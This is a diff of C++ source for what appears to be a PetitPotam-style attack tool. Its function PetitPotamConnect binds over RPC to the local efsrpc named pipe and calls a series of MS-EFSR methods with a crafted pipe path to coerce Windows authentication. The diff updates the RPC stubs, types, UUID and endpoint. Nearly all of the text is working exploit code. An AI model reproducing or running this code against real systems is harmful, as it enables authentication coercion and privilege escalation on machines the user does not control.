@@ -1,10 +1,9 @@
-﻿#include "ms-efsr_h.h"
-#include <windows.h>
-#include <stdio.h>
+﻿#pragma once
+
+#include "ms-efsr_h.h"
 #include <thread>
 #include <tchar.h>
 #include <strsafe.h>
-#include <conio.h>
 #include <iostream>
 #include <userenv.h>
 
@@ -212,10 +211,10 @@ cleanup:
 
 void PetitPotamConnect(DWORD EfsID)
 {
-    RPC_WSTR ObjUuid = (RPC_WSTR)L"c681d488-d850-11d0-8c52-00c04fd90f7e";    // Pointer to a null-terminated string representation of an object UUID. 
+    RPC_WSTR ObjUuid = (RPC_WSTR)L"df1941c5-fe89-4e79-bf10-463657acf44d";    // Pointer to a null-terminated string representation of an object UUID. 
     RPC_WSTR ProtSeq = (RPC_WSTR)L"ncacn_np";                                // Pointer to a null-terminated string representation of a protocol sequence.;
     RPC_WSTR NetworkAddr = (RPC_WSTR)L"\\\\127.0.0.1";                       // Pointer to a null-terminated string representation of a network address.
-    RPC_WSTR Endpoint = (RPC_WSTR)L"\\pipe\\lsass";                          // Pointer to a null-terminated string representation of an endpoint.
+    RPC_WSTR Endpoint = (RPC_WSTR)L"\\pipe\\efsrpc";                          // Pointer to a null-terminated string representation of an endpoint.
     RPC_WSTR Options = NULL;                                                 // Pointer to a null-terminated string representation of network options.
     RPC_WSTR StringBinding;                                                  // Returns a pointer to a pointer to a null-terminated string representation of a binding handle.
 
@@ -282,8 +281,9 @@ void PetitPotamConnect(DWORD EfsID)
              */
 
             PVOID hContext;
-            result = Proc0_EfsRpcOpenFileRaw_Downlevel(binding_h, &hContext, PipeFileName, 0);
+            result = EfsRpcOpenFileRaw(binding_h, &hContext, PipeFileName, 0);
         }
+
         if (EfsID == 1)
         {
             wprintf(L"[+] Invoking EfsRpcEncryptFileSrv with target path: %ws.\r\n", PipeFileName);
@@ -295,7 +295,7 @@ void PetitPotamConnect(DWORD EfsID)
              *  );
             */
 
-            result = Proc4_EfsRpcEncryptFileSrv_Downlevel(binding_h, PipeFileName);
+            result = EfsRpcEncryptFileSrv(binding_h, PipeFileName);
         }
 
         if (EfsID == 2)
@@ -310,8 +310,9 @@ void PetitPotamConnect(DWORD EfsID)
              *  );
              */
 
-            result = Proc5_EfsRpcDecryptFileSrv_Downlevel(binding_h, PipeFileName, 0);
+            result = EfsRpcDecryptFileSrv(binding_h, PipeFileName, 0);
         }
+
         if (EfsID == 3)
         {
             wprintf(L"[+] Invoking EfsRpcQueryUsersOnFile with target path: %ws.\r\n", PipeFileName);
@@ -324,8 +325,8 @@ void PetitPotamConnect(DWORD EfsID)
              *  );
              */
 
-            Struct_220_t* Users;
-            result = Proc6_EfsRpcQueryUsersOnFile_Downlevel(binding_h, PipeFileName, &Users);
+            ENCRYPTION_CERTIFICATE_HASH_LIST* Users;
+            result = EfsRpcQueryUsersOnFile(binding_h, PipeFileName, &Users);
         }
         if (EfsID == 4)
         {
@@ -339,8 +340,8 @@ void PetitPotamConnect(DWORD EfsID)
              *  );
              */
 
-            Struct_220_t* RecoveryAgents;
-            result = Proc7_EfsRpcQueryRecoveryAgents_Downlevel(binding_h, PipeFileName, &RecoveryAgents);
+            ENCRYPTION_CERTIFICATE_HASH_LIST* RecoveryAgents;
+            result = EfsRpcQueryRecoveryAgents(binding_h, PipeFileName, &RecoveryAgents);
         }
         if (EfsID == 5)    // error
         {
@@ -354,8 +355,8 @@ void PetitPotamConnect(DWORD EfsID)
              *  );
              */
 
-            Struct_220_t Users;
-            result = Proc8_EfsRpcRemoveUsersFromFile_Downlevel(binding_h, PipeFileName, &Users);
+            ENCRYPTION_CERTIFICATE_HASH_LIST Users;
+            result = EfsRpcRemoveUsersFromFile(binding_h, PipeFileName, &Users);
         }
         if (EfsID == 6)
         {
@@ -369,8 +370,8 @@ void PetitPotamConnect(DWORD EfsID)
              *  );
              */
 
-            Struct_346_t EncryptionCertificates;
-            result = Proc9_EfsRpcAddUsersToFile_Downlevel(binding_h, PipeFileName, &EncryptionCertificates);
+            ENCRYPTION_CERTIFICATE_LIST EncryptionCertificates;
+            result = EfsRpcAddUsersToFile(binding_h, PipeFileName, &EncryptionCertificates);
         }
         if (EfsID == 7)
         {
@@ -385,8 +386,8 @@ void PetitPotamConnect(DWORD EfsID)
              *  );
              */
 
-            Struct_392_t* KeyInfo;
-            Proc12_EfsRpcFileKeyInfo_Downlevel(binding_h, PipeFileName, 0, &KeyInfo);
+            EFS_RPC_BLOB* KeyInfo;
+            result = EfsRpcFileKeyInfo(binding_h, PipeFileName, 0, &KeyInfo);
 
         }
         if (EfsID == 8)    // error
@@ -405,8 +406,8 @@ void PetitPotamConnect(DWORD EfsID)
              *  );
              */
 
-            Struct_392_t RelativeSD;
-            result = Proc13_EfsRpcDuplicateEncryptionInfoFile_Downlevel(binding_h, PipeFileName, PipeFileName, 1, 0, &RelativeSD, FALSE);
+            EFS_RPC_BLOB RelativeSD;
+            result = EfsRpcDuplicateEncryptionInfoFile(binding_h, PipeFileName, PipeFileName, 1, 0, &RelativeSD, FALSE);
         }
 
         if (EfsID == 9)
@@ -423,9 +424,9 @@ void PetitPotamConnect(DWORD EfsID)
              *  );
              */
 
-            Struct_392_t Reserved;
-            Struct_346_t EncryptionCertificates;
-            result = Proc15_EfsRpcAddUsersToFileEx_Downlevel(binding_h, 0, &Reserved, PipeFileName, &EncryptionCertificates);
+            EFS_RPC_BLOB Reserved;
+            ENCRYPTION_CERTIFICATE_LIST EncryptionCertificates;
+            result = EfsRpcAddUsersToFileEx(binding_h, 0, &Reserved, PipeFileName, &EncryptionCertificates);
         }
 
         if (EfsID == 10)    // error
@@ -443,9 +444,9 @@ void PetitPotamConnect(DWORD EfsID)
              *  );
              */
 
-            Struct_392_t Reserved;
-            Struct_392_t* KeyInfo;
-            Proc16_EfsRpcFileKeyInfoEx_Downlevel(binding_h, 0, &Reserved, PipeFileName, 0, &KeyInfo);
+            EFS_RPC_BLOB Reserved;
+            EFS_RPC_BLOB* KeyInfo;
+            result = EfsRpcFileKeyInfoEx(binding_h, 0, &Reserved, PipeFileName, 0, &KeyInfo);
         }
         if (EfsID == 11)    // error
         {
@@ -459,8 +460,8 @@ void PetitPotamConnect(DWORD EfsID)
              *  );
              */
 
-            Struct_392_t* EfsStreamBlob;
-            Proc18_EfsRpcFileKeyInfoEx_Downlevel(binding_h, PipeFileName, &EfsStreamBlob);
+            EFS_RPC_BLOB* EfsStreamBlob;
+            result = EfsRpcGetEncryptedFileMetadata(binding_h, PipeFileName, &EfsStreamBlob);
         }
 
         if (EfsID == 12)    // error
@@ -477,12 +478,11 @@ void PetitPotamConnect(DWORD EfsID)
              *  );
              */
 
-            Struct_392_t OldEfsStreamBlob;
-            Struct_392_t NewEfsStreamBlob;
-            Struct_492_t NewEfsSignature;
-            Proc19_EfsRpcFileKeyInfoEx_Downlevel(binding_h, PipeFileName, &OldEfsStreamBlob, &NewEfsStreamBlob, &NewEfsSignature);
+            EFS_RPC_BLOB OldEfsStreamBlob;
+            EFS_RPC_BLOB NewEfsStreamBlob;
+            ENCRYPTED_FILE_METADATA_SIGNATURE NewEfsSignature;
+            result = EfsRpcSetEncryptedFileMetadata(binding_h, PipeFileName, &OldEfsStreamBlob, &NewEfsStreamBlob, &NewEfsSignature);
         }
-
 
         LocalFree(PipeFileName);
     }
